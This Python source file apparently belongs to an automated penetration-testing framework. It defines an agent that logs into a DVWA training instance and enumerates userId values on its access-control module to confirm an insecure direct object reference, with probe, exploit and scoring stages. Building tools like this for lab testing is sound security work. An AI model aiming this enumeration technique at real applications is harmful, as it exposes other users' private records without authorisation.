"""Access Control IDOR agent with real HTTP execution."""

from __future__ import annotations

import logging
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import VerificationResult, Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "ac_idor"
MODULE_PATH = "/vulnerabilities/authbypass/"
_PROBE_OBSERVATION_KEY = "object_ids_enumerable"

# Signals indicating the response contains user-specific data
_DATA_SIGNALS = [
    "admin", "gordonb", "pablo", "smithy",
    "first name", "surname", "user id",
    "password",
]


def _probe_preconditions(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Enumerate predictable object IDs to detect IDOR.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    verifier = Verifier()

    # Get baseline response for user ID 1 (the admin user)
    baseline_text = ""
    baseline_len = 0
    baseline_signals = VerificationResult()
    try:
        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
        baseline_text = baseline_resp.text
        baseline_len = len(baseline_text)
        baseline_signals = verifier.contains_any(baseline_text, _DATA_SIGNALS)
    except Exception as exc:
        logger.warning("[%s] PROBE baseline request failed: %s", AGENT_ID, exc)
        # Baseline failed — still attempt probes and compare them against each other
        baseline_text = ""

    sent_any = False
    responses: list[tuple[str, str, int]] = []  # (payload, text, length)
    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            test_id = payload.strip()
            if test_id == "1":
                continue
            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, True))
            if resp.status_code == 200:
                responses.append((test_id, resp.text, len(resp.text)))
                resp_signals = verifier.contains_any(resp.text, _DATA_SIGNALS)
                # IDOR detected if different user data is returned
                if baseline_text:
                    if resp_signals.ok and len(resp.text) != baseline_len:
                        observations[_PROBE_OBSERVATION_KEY] = True
                        return True, tried, observations, events
                    if resp.text != baseline_text and len(resp.text) > 100:
                        observations[_PROBE_OBSERVATION_KEY] = True
                        return True, tried, observations, events
                else:
                    # No baseline — compare against other responses
                    if len(responses) >= 2:
                        first_text = responses[0][1]
                        if resp.text != first_text and resp_signals.ok:
                            observations[_PROBE_OBSERVATION_KEY] = True
                            return True, tried, observations, events
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, f"userId={payload}", None, False))

    if not sent_any:
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[int, list[str], list[str], list[dict]]:
    """Confirm unauthorized data access. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    verifier = Verifier()

    # Fetch baseline for differential comparison
    baseline_text = ""
    try:
        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
        baseline_text = baseline_resp.text
    except Exception as exc:
        logger.warning("[%s] EXPLOIT baseline request failed: %s", AGENT_ID, exc)

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            test_id = payload.strip()
            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, True))
            if resp.status_code == 200:
                result = verifier.contains_any(resp.text, _DATA_SIGNALS)
                # Require response to differ from baseline to confirm IDOR
                if result.ok and resp.text != baseline_text:
                    score = max(score, 3)
                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                    break
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, f"userId={payload}", None, False))

    return score, tried, confirmed, events

def ac_idor_agent(state: ExploitationState) -> dict[str, Any]:
    """Run PROBE -> EXPLOIT -> CHAIN CHECK for ac_idor."""
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)

        payload_lib = PayloadLibrary()
        payload_set = payload_lib.get(AGENT_ID, security_level)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = list(payload_set.probe) or ["2", "3", "4"]
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        exploit_payloads = list(payload_set.exploit) or ["5", "6"]
        bypass_payloads = list(payload_set.bypass.get(security_level, []))
        all_exploit = exploit_payloads + bypass_payloads

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried)
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
